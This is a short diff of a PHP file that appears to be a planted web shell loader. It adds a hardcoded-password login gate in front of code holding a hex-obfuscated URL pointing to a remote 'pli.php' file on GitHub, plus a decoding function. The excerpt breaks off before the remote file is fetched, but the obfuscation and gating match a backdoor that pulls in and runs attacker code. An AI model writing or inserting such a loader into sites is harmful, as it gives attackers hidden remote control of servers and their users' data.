@@ -1,4 +1,26 @@
 <?php
+session_start();
+$ewean = 'Hoki112233@Aa';
+
+if (!isset($_SESSION['authenticated'])) {
+    if (isset($_POST['password'])) {
+        if ($_POST['password'] === $ewean) {
+            $_SESSION['authenticated'] = true;
+        } else {
+            echo "Password salah!";
+        }
+    }
+
+    if (!isset($_SESSION['authenticated'])) {
+        echo '<form method="post">';
+        echo 'Password: <input type="password" name="password">';
+        echo '<input type="submit" value="Login">';
+        echo '</form>';
+        exit;
+    }
+}
+?>
+<?php
 $hexUrl = '68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F6D61796F6E6172782F696D6F6E6C7977616E74746F2F726566732F68656164732F6D61696E2F706C692E706870';
 
 function hex2str($hex) {
